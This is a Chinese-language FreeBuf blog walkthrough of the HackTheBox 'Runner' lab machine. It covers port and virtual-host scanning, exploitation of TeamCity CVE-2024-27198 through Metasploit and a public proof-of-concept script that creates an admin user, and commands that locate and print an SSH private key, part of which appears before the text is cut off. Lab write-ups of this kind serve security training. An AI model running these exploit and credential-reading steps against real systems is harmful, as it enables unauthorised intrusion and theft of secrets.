---
title: HackThebox Runner Walkthrough
url: https://www.freebuf.com/articles/web/399754.html
source: FreeBuf网络安全行业门户
date: 2024-05-12
fetch_date: 2025-10-06T17:16:29.674366
---

# HackThebox Runner Walkthrough

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

HackThebox Runner Walkthrough

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

HackThebox Runner Walkthrough

2024-05-11 11:47:11

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

欢迎关注公众号 xor27

### 端口扫描

```
➜  hackthebox nmap -A -Pn 10.10.11.13 -sV -oN Runner.tcp
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-21 22:10 CST
Stats: 0:02:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 78.68% done; ETC: 22:13 (0:00:41 remaining)
Nmap scan report for 10.10.11.13 (10.10.11.13)
Host is up (0.35s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open     http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
981/tcp   filtered unknown
1096/tcp  filtered cnrprotocol
8000/tcp  open     nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10566/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 360.84 seconds
```

80 端口是一个正常的产品展示网页，这里先看看非常规的 8000 端口

> Nagios Service Check Acceptor (NSCA) 是一个流行的 Nagios 插件，它允许从外部源（如应用程序、自定义脚本或第三方监控工具）向 Nagios 服务器发送被动检查结果。

查了一下 CVE 都比较老，先尝试目录扫描。

### 目录扫描

```
➜  wordlists ffuf -u http://runner.htb:8000/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb:8000/FUZZ
 :: Wordlist         : FUZZ: /Users/apple/tools/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200
________________________________________________

health                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 285ms]
version                 [Status: 200, Size: 9, Words: 1, Lines: 1, Duration: 277ms]
```

可惜都没有有用的信息，尝试虚拟主机爆破

### 虚拟主机爆破

```
➜  wordlists ffuf -u http://runner.htb -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt  -H "Host: FUZZ.runner.htb" -fw 4

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb
 :: Wordlist         : FUZZ: /Users/apple/tools/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 381ms]
:: Progress: [57055/57055] :: Job [1/1] :: 24 req/sec :: Duration: [0:10:07] :: Errors: 0 ::
➜  wordlists
```

### teamcity

> TeamCity 是由 JetBrains 公司开发的一款功能强大的持续集成和持续交付工具。它支持多种技术栈，包括 Java、.NET、Python 等，并且提供了一个可视化的项目管理界面，帮助团队成员直观地查看和管理所有项目，包括构建状态、测试结果、代码质量等信息

经典的 CI/CD 平台，版本比较老，先搜索 CVE。

![截屏2024-04-26_21.37.15.png](https://image.3001.net/images/20240429/1714379080_662f594813c9e88a924b1.png!small)

### **CVE-2024-27198**

![截屏2024-04-26_22.00.52.png](https://image.3001.net/images/20240429/1714379092_662f595468187c2659d67.png!small)

获取完整的 Shell

```
meterpreter > shell
Process 1 created.
Channel 1 created.
which python
whoami
tcuser
which python3
/usr/bin/python3
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
   Welcome to TeamCity Server Docker container

 * Installation directory: /opt/teamcity
 * Logs directory:         /opt/teamcity/logs
 * Data directory:         /data/teamcity_server/datadir

   TeamCity will be running under 'tcuser' user (1000/1000)

tcuser@647a82f29ca0:~/bin$
```

### 容器逃逸

在本机上迟迟突破不了， TeamCity 这个平台可能成为突破口。
依然是这个 CVE：<https://github.com/yoryio/CVE-2024-27198>

```
tcuser@647a82f29ca0:~/bin$ python3 CVE-2024-27198.py -t http://localhost:8111 -u xor27 -p xor27
<27198.py -t http://localhost:8111 -u xor27 -p xor27
[+] Version Found:  2023.05.3 (build 129390)
[+] Server vulnerable, returning HTTP 200
[+] New user xor27 created succesfully! Go to http://localhost:8111/login.html to login with your new credentials :)
tcuser@647a82f29ca0:~/bin$
```

发现 John 和 Matthew

![截屏2024-04-27_09.04.24.png](https://image.3001.net/images/20240429/1714379102_662f595e5edf0a98c50d2.png!small)

这里翻到了 OpenSSH 密钥，但只能直接复制公钥。id\_rsa 又是私钥的名字，我们可以尝试在服务器上查找这个文件。

![截屏2024-04-27_09.07.56.png](https://image.3001.net/images/20240429/1714379112_662f596802d5bde308883.png!small)

```
tcuser@647a82f29ca0:~/bin$ find / -type f -name "id_rsa" 2>/dev/null
find / -type f -name "id_rsa" 2>/dev/null
/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
tcuser@647a82f29ca0:~/bin$ cat /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
<fig/projects/AllProjects/pluginData/ssh_keys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq
5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5
iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB
Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2
EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi
NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH
sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6
dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw
fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+
IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2
EKUL+MJYdR+IVJYGlUopqAKosyT1KsgIvaFIR1xmO9ceYAlF3lC2STHA2CgWds83sd/ojw
WIvbU7JwiElyL0w299n5ptakZiEclwAAAAMBAAEAAAGA...